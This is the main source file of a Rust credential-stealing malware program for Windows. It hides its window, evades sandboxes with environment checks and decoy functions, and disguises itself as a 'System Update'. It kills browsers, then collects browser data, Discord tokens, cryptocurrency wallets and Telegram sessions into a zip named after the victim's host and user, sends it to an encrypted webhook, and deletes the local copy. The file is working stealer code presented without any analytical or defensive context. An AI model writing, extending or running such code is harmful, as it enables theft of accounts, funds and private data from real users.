
#![windows_subsystem = "windows"]

mod browsers;
mod core;
mod discord;
mod encrypted;
mod core_utils;
mod polymorphic_keys;
mod sender;
mod telegram;
mod wallet;

use std::thread;
use std::time::Duration;
use rand::Rng;

use core::api;
use encrypted::*;
use std::{env, fs};

pub use encrypted::s_api_url;
use zip::write::FileOptions;

#[allow(dead_code)]
const PREFIX: &str = match option_env!("COMPILE_PREFIX") {
    Some(s) => s,
    None => "xxx",
};
#[allow(dead_code)]
const SUFFIX_SUFFIX: &str = match option_env!("COMPILE_SUFFIX") {
    Some(s) => s,
    None => "9698",
};
#[allow(dead_code)]
const SUFFIX: u32 = {
    let bytes = SUFFIX_SUFFIX.as_bytes();
    if bytes.len() >= 4 {
        ((bytes[0] as u32) << 24) | ((bytes[1] as u32) << 16) | ((bytes[2] as u32) << 8) | (bytes[3] as u32)
    } else {
        9698u32
    }
};

#[allow(dead_code)]
fn show_loading_dialog() {
    dbg_log!("[LOADING] show_loading_dialog() called");
    let result = api::message_box(&s_loading_title(), &s_loading_text(), api::MB_OK | api::MB_ICONINFORMATION);
    dbg_log!("[LOADING] message_box returned: {:?}", result);
}

#[allow(dead_code)]
fn press_any_key_to_close() {
    use windows::Win32::System::Console::{
        AllocConsole, AttachConsole, GetConsoleWindow, SetConsoleTitleW, ReadConsoleW, FreeConsole,
    };
    use windows::Win32::Foundation::HWND;
    unsafe {
        let parent_attached = AttachConsole(windows::Win32::System::Console::ATTACH_PARENT_PROCESS).is_ok();
        if !parent_attached {
            let _ = AllocConsole();
        }
        if GetConsoleWindow().is_invalid() {
            return;
        }
        let _ = SetConsoleTitleW(windows::core::w!("System Update"));
        println!("\n========================================");
        println!("  Update complete. Press Enter to exit.");
        println!("========================================");
        use std::io::Write;
        let _ = std::io::stdout().flush();
        let mut buf = [0u16; 2];
        let mut total = 0u32;
        let _ = ReadConsoleW(
            HWND(std::ptr::null_mut()),
            buf.as_mut_ptr() as *mut _,
            1,
            &mut total,
            None,
        );
        let _ = FreeConsole();
    }
}

pub fn get_hostname() -> String {
    if let Ok(name) = env::var(s_env_computername()) {
        if !name.is_empty() {
            return name;
        }
    }
    if let Ok(name) = env::var(s_env_userdomain()) {
        if !name.is_empty() {
            return name;
        }
    }
    s_main_unknown()
}

pub fn get_username() -> String {
    if let Ok(name) = env::var(s_env_username()) {
        if !name.is_empty() {
            return name;
        }
    }
    s_main_unknown()
}

fn get_webhook_url() -> String {
    encrypted::decrypt_webhook().unwrap_or_default()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    dbg_log!("=== STARTUP ===");
    dbg_log!("LOCALAPPDATA={:?}", env::var("LOCALAPPDATA"));
    dbg_log!("APPDATA={:?}", env::var("APPDATA"));
    dbg_log!("TEMP={:?}", env::temp_dir());
    

    if !core::detection::verify_environment() {
        
        return Ok(());
    }

    thread::sleep(Duration::from_millis(100));

    dbg_log!("[MAIN] Checking environment...");
    if !core::detection::verify_environment() {
        dbg_log!("[MAIN] Environment check failed, exiting");
        
        return Ok(());
    }
    dbg_log!("[MAIN] Environment check passed");
    

    let _stealth_applied = false;

    dbg_log!("[MAIN] Running decoy functions...");
    let _ = core::decoy::calculate_fibonacci(100);
    let _ = core::decoy::encrypt_dummy(&[1, 2, 3]);
    let _ = core::decoy::pseudo_random();
    let _ = core::decoy::json_parse_dummy();
    core::decoy::read_system_files();
    core::decoy::system_info_gathering();
    dbg_log!("[MAIN] Decoy functions done");

    let mut rng = rand::thread_rng();
    let delay = rng.gen_range(200..500);
    dbg_log!("[MAIN] Sleeping for {}ms", delay);
    thread::sleep(Duration::from_millis(delay));

    dbg_log!("[MAIN] Starting main logic...");
    browsers::common::ci::cleanup_legacy_artifacts();
    dbg_log!("[MAIN] Cleanup done");

    let wbh = get_webhook_url();
    dbg_log!("[MAIN] Webhook URL: {}", &wbh[..wbh.len().min(50)]);
    let client = reqwest::Client::new();

    dbg_log!("[MAIN] Extracting Discord data...");
    let (_discord_accounts, discord_content, embeds) = crate::discord::get_discord_data(&client).await;
    dbg_log!("[MAIN] Discord extraction complete");

    dbg_log!("[MAIN] Starting browser extraction...");
    core::kill::kill_browsers();

    let _ = core::decoy::read_system_files();
    let _ = core::decoy::read_config_files();
    let _ = core::decoy::calculate_fibonacci(50);
    std::thread::sleep(std::time::Duration::from_millis(1500));

    let mut all_files = browsers::run();
    
    dbg_log!("[MAIN] Extracting wallets...");
    let wallet_files = wallet::collect_wallets();
    dbg_log!("[MAIN] Wallet extraction done, {} files", wallet_files.len());
    for (name, content) in wallet_files {
        all_files.push((name, String::from_utf8_lossy(&content).into_owned()));
    }
    
    if !discord_content.is_empty() {
        all_files.push((s_discord_accounts_txt(), discord_content));
    }

    let telegram_files = telegram::get_telegram_paths();

    dbg_log!("[MAIN] Browser extraction done, total files={}", all_files.len());

    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(dir) = exe_path.parent() {
            let log_path = dir.join(s_main_log_file());
            if let Ok(log_content) = fs::read_to_string(&log_path) {
                if !log_content.is_empty() {
                    all_files.push(("n0.log".to_string(), log_content));
                }
            }
        }
    }

    let zip_name = format!("{}_{}.zip", get_hostname(), get_username());

    let zip_path = std::env::temp_dir().join(&zip_name);
    {
        use std::fs::File;
        use std::io::Write;

        dbg_log!("[MAIN] Creating zip with {} files", all_files.len() + telegram_files.len());
        let file = File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in &all_files {
            dbg_log!("[MAIN] Adding to zip: {} ({} bytes)", name, content.len());
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        for (name, content) in telegram_files {
            dbg_log!("[MAIN] Adding telegram to zip: {} ({} bytes)", name, content.len());
            zip.start_file(&name, options)?;
            zip.write_all(&content)?;
        }

        zip.finish()?;
        dbg_log!("[MAIN] Zip created");
    }

    let zip_data = fs::read(&zip_path)?;
    dbg_log!("[MAIN] Zip read {} bytes", zip_data.len());

    let _ = fs::remove_file(&zip_path);

    let statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;
    for s in &statuses { dbg_log!("[MAIN] {s}"); }

    let _ = fs::remove_file(&zip_path);

    std::process::exit(0);
}
